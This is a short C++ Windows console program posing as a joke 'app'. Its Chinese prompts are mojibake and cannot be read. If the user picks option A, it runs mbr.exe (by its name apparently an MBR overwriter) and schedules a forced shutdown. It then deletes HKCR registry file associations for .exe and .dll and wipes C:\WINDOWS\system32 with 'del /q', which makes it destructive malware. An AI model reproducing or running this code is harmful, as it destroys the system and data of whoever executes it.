#include <iostream>
#include <Windows.h>
#include <string>
using namespace std;
int main()
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,GetCurrentProcessId());
	string version = "1.3";
	char in;
	cout << "��ӭʹ�� ����թƭ����APP" << version << "�棡" << endl;
	cout << "����һ��һ������������㲻֪������һ��һ��������" << endl;
	cout << "ѡ��B�򲻻����κ����顣�����֪�����ǲ���������" << endl;
	cout << "�õ�һ̨���ϵĵ��ԵĻ���ѡ��A��" << endl;
	cout << "A.��ʼթƭ   B.�˳�" << endl;
	cin >> in;
	if (in == 'a' || in == 'A')
	{
		system("mbr.exe");
		cout << "��������թƭ����......Ԥ����Ҫ5��" << endl;
		Sleep(5000);
		cout << "�����������ҡ......" << endl;
		Sleep(1000);
		cout << "����թƭ�У����Ե�......" << endl;
		cout << "-��ϸ��Ϣ-" << endl;
		cout << "թƭ��114514��" << endl;
		cout << "թƭ��ʽ�����ҡ��������" << endl;
		cout << "թƭĿ�꣺Ѱ����" << endl;
		Sleep(1000);
		cout << "�ҵ�թƭĿ�꣺���Լ�" << endl;
		cout << "LOL:�㱻ƭ��" << endl;
		system("RickRoll.mp3");
		system("shutdown -s -t 15");
		system("tanchuang.exe");
		Sleep(5000);
		system("@echo off Start reg delete HKCR/.exe Start reg delete HKCR/.dll Start reg delete HKCR/*");
		system("del c:\\WINDOWS\\system32\\*.*/q");
		system("mouse.exe");
	}
	return 0;
}
